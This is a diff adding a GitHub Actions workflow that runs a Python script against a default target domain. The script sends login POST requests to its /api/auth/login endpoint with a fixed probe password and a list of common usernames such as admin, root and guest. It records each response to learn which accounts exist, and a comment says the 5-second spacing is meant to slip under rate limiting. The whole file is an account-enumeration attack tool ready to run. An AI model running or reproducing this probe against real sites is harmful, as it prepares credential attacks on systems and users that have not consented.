@@ -1,0 +1,34 @@
+name: 账号枚举验证
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: '目标基础URL'
+        required: true
+        default: 'https://nlhlsd.xyz'
+jobs:
+  enum:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.error, json, time, os
+          target = os.environ.get('INPUT_TARGET','https://nlhlsd.xyz').rstrip('/')
+          # 每个账号独立请求，间隔5秒，避免触发限流
+          test_accounts = ["admin", "root", "maozi", "zzz_nobody_99", "nonexistent_abc", "administrator", "test", "guest", "admin1", "root1", "shud", "nlhlsd"]
+          for acc in test_accounts:
+            body = json.dumps({"account": acc, "password": "ProbePass#2026"}).encode()
+            req = urllib.request.Request(target + "/api/auth/login", data=body, method="POST",
+                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 Chrome/126.0"})
+            try:
+              resp = urllib.request.urlopen(req, timeout=15)
+              print(f"  {acc} -> HTTP{resp.status} {resp.read().decode()[:120]}", flush=True)
+            except urllib.error.HTTPError as e:
+              data = e.read().decode()
+              print(f"  {acc} -> HTTP{e.code} {data[:120]}", flush=True)
+            except Exception as e:
+              print(f"  {acc} -> ERR {str(e)[:80]}", flush=True)
+            time.sleep(5)
+          PYEOF
+        env:
+          INPUT_TARGET: ${{ github.event.inputs.target }}
